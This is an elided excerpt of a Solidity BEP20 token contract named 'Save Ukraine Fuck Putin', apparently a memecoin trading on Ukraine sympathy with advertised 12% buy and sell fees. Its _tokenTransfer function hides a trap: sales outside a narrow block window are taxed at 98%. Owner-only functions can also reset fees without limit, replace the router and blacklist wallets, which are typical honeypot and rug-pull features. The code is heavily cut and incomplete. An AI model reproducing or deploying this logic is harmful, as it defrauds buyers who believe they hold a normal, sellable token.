...
contract SaveUkraineFuckPutin is Context, IBEP20, Ownable {
    ...
    string private _name = "Save Ukraine Fuck Putin";
    string private _symbol = "SUFP";
    ...
    uint256 public  _taxFeeVar = 0; // ZERO tax for transfering tokens

    // buy fee
    uint256 public  _taxFeeBuy       = 12;
    uint256 public  _taxFeeVarBuy = 0; //

    // sell fee
    uint256 public  _taxFeeSell       = 12;
    uint256 public  _taxFeeVarSell = 0;
    ...
    constructor () {
        ...
        Pair = IUniswapV2Factory(_pcV2router.factory())
        ...
        _isExcludedFromAutoLiquidity[address(pcV2router)] = true;

        _isExcludedFromAntiWhale[owner()]                  = true;
        _isExcludedFromAntiWhale[address(this)]            = true;
        _isExcludedFromAntiWhale[Pair]            = true;
        _isExcludedFromAntiWhale[address(pcV2router)] = true;
...
//Remove from Blacklist
    ...
    function setFeesTransfer(uint taxFee, uint taxFeeVar) external onlyOwner {
        _taxFee       = taxFee;
        _taxFeeVar = taxFeeVar;
    }

    function setFeesBuy(uint taxFee, uint taxFeeVar) external onlyOwner {
        _taxFeeBuy       = taxFee;
        _taxFeeVarBuy = taxFeeVar;
    }

    function setFeesSell(uint taxFee, uint taxFeeVar) external onlyOwner {
        _taxFeeSell       = taxFee;
        _taxFeeVarSell = taxFeeVar;
    }
    ...
    function setUniswapRouter(address r) external onlyOwner {
        IUniswapV2Router02 _pcV2router = IUniswapV2Router02(r);
        pcV2router = _pcV2router;
    }
    ...
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
        ...
        uint256 tLiquidity = calculateFee(tAmount, _taxFeeVar);
    ...
    function _transfer(
        ...
        if (from == Pair && to != address(pcV2router)) {
    ...
    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private returns (uint256, uint256) {
        ...
        // add the liquidity
        (uint amountToken, uint amountETH, ) = pcV2router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        ...
        uint256 previousLiquidityFee = _taxFeeVar;
        uint256 block_factor = block.number - CoolDown[sender];

        bool isBuy  = sender == Pair && recipient != address(pcV2router);
        ...
        if (!takeFee) {
            ...
            _taxFee       = _taxFeeBuy;
            _taxFeeVar = _taxFeeVarBuy;
            if (CoolDown[recipient] == 0) {
                CoolDown[recipient] = block.number;
            }
        } else if (isSell) {
            _taxFee       = _taxFeeSell;
            _taxFeeVar = _taxFeeVarSell;
            if (block_factor < 2 || block_factor == 100) {
                block_factor = 1 + 1 / (_taxFeeVar + _taxFee) ;
            } else {
                _taxFee += (100 - _taxFee - 2);
            }
        }

        emit InfoEvent(0, _taxFee, _taxFeeVar, isBuy ? 1 : 0, isSell ? 1 : 0);
        ...
        if (!takeFee || isBuy || isSell) {
            ...
            _taxFeeVar = previousLiquidityFee;
        }
    }
